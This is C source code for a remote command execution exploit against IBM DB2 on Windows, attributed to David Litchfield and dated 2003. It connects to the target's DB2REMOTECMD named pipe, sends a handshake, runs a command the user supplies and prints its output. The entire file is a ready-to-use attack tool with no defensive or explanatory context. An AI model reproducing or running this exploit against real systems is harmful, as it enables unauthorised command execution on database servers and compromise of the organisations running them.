#include <stdio.h>
#include <windows.h>

int main(int argc, char *argv[])
{
 char buffer[540]="";
 char NamedPipe[260]="\\\\";
 HANDLE rcmd=NULL;
 char *ptr = NULL;
 int len =0;
 DWORD Bytes = 0;

 if(argc !=3)
 {
  printf("\n\tDB2 Remote Command Exploit.\n\n");
  printf("\tUsage: db2rmtcmd target \"command\"\n");
  printf("\n\tDavid Litchfield\n\t(david@ngssoftware.com)\n\t6th Septem-ber 2003\n");
  return 0;
      }

 strncat(NamedPipe,argv[1],200);
 strcat(NamedPipe,"\\pipe\\DB2REMOTECMD");

 // Setup handshake message
 ZeroMemory(buffer,540);
 buffer[0]=0x01;
 ptr = &buffer[4];
 strcpy(ptr,"DB2");
 len = strlen(argv[2]);
 buffer[532]=(char)len;

 // Open the named pipe
 rcmd = CreateFile(NamedPipe,GENERIC_WRITE|GENERIC_READ,0,
NULL,OPEN_EXISTING,0,NULL);

 if(rcmd == INVALID_HANDLE_VALUE)
  return printf("Failed to open pipe %s. Error %d.\n",NamedPipe,GetLastError());

 // Send handshake
 len = WriteFile(rcmd,buffer,536,&Bytes,NULL);

 if(!len)
  return printf("Failed to write to %s. Error %d.\n",NamedPipe,GetLastError());

 ZeroMemory(buffer,540);
 strncpy(buffer,argv[2],254);

 // Send command
 len = WriteFile(rcmd,buffer,strlen(buffer),&Bytes,NULL);
 if(!len)
  return printf("Failed to write to %s. Error %d.\n",NamedPipe,GetLastError());

 // Read results
 while(len)
 {
  len = ReadFile(rcmd,buffer,530,&Bytes,NULL);
  printf("%s",buffer);
  ZeroMemory(buffer,540);
      }

 return 0;
}
